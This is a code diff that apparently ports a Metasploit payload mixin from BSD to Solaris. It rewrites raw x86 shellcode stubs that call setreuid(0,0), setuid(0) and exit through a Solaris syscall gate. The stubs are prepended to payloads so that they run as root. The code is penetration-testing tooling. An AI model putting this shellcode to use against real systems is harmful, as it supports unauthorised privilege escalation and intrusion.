@@ -2,15 +2,15 @@ require 'msf/core'
 
 ###
 #
-# This class is here to implement advanced features for bsd-based
-# payloads. BSD payloads are expected to include this module if
+# This class is here to implement advanced features for solaris-based
+# payloads. Solaris payloads are expected to include this module if
 # they want to support these features.
 #
 ###
-module Msf::Payload::Bsd
+module Msf::Payload::Solaris
 
 	#
-	# This mixin is chained within payloads that target the BSD platform.
+	# This mixin is chained within payloads that target the Solaris platform.
 	# It provides special prepends, to support things like chroot and setuid.
 	#
 	def initialize(info = {})
@@ -18,13 +18,6 @@ module Msf::Payload::Bsd
 
 		register_advanced_options(
 			[
-				Msf::OptBool.new('PrependSetresuid',
-					[
-						false,
-						"Prepend a stub that executes the setresuid(0, 0, 0) system call",
-						"false"
-					]
-				),
 				Msf::OptBool.new('PrependSetreuid',
 					[
 						false,
@@ -46,7 +39,7 @@ module Msf::Payload::Bsd
 						"false"
 					]
 				),
-			], Msf::Payload::Bsd)
+			], Msf::Payload::Solaris)
 
 		ret
 	end
@@ -66,36 +59,30 @@ module Msf::Payload::Bsd
 		# Handle all x86 code here
 		if (test_arch.include?(ARCH_X86))
 
-			# Prepend
+			# Syscall code
+			sc = "\x68\xff\xd8\xff\x3c" +#   pushl   $0x3cffd8ff                #
+			     "\x6a\x65"             +#   pushl   $0x65                      #
+			     "\x89\xe6"             +#   movl    %esp,%esi                  #
+			     "\xf7\x56\x04"         +#   notl    0x04(%esi)                 #
+			     "\xf6\x16"              #   notb    (%esi)                     #
 
-			if (datastore['PrependSetresuid'])
-				# setresuid(0, 0, 0)
-				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-				       "\x50"                 +#   pushl   %eax                       #
-				       "\x50"                 +#   pushl   %eax                       #
-				       "\x50"                 +#   pushl   %eax                       #
-				       "\x50"                 +#   pushl   %eax                       #
-				       "\x66\xb8\x37\x01"     +#   movw    $0x0137,%ax                #
-				       "\xcd\x80"              #   int     $0x80                      #
-			end
+			# Prepend
 
 			if (datastore['PrependSetreuid'])
 				# setreuid(0, 0)
 				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
 				       "\x50"                 +#   pushl   %eax                       #
 				       "\x50"                 +#   pushl   %eax                       #
-				       "\x50"                 +#   pushl   %eax                       #
-				       "\xb0\x7e"             +#   movb    $0x7e,%al                  #
-				       "\xcd\x80"              #   int     $0x80                      #
+				       "\xb0\xca"             +#   movb    $0xca,%al                  #
+				       "\xff\xd6"              #   call    *%esi                      #
 			end
 
 			if (datastore['PrependSetuid'])
 				# setuid(0)
 				pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
 				       "\x50"                 +#   pushl   %eax                       #
-				       "\x50"                 +#   pushl   %eax                       #
 				       "\xb0\x17"             +#   movb    $0x17,%al                  #
-				       "\xcd\x80"              #   int     $0x80                      #
+				       "\xff\xd6"              #   call    *%esi                      #
 			end
 
 			# Append
@@ -105,7 +92,17 @@ module Msf::Payload::Bsd
 				app << "\x31\xc0"             +#   xorl    %eax,%eax                  #
 				       "\x50"                 +#   pushl   %eax                       #
 				       "\xb0\x01"             +#   movb    $0x01,%al                  #
-				       "\xcd\x80"              #   int     $0x80                      #
+				       "\xff\xd6"              #   call    *%esi                      #
+			end
+
+			# Prepend syscall code to prepend block
+			if not (pre.empty?)
+				pre = sc + pre
+			end
+
+			# Prepend syscall code to append block
+			if not (app.empty?)
+				app = sc + app
 			end
 
 		end
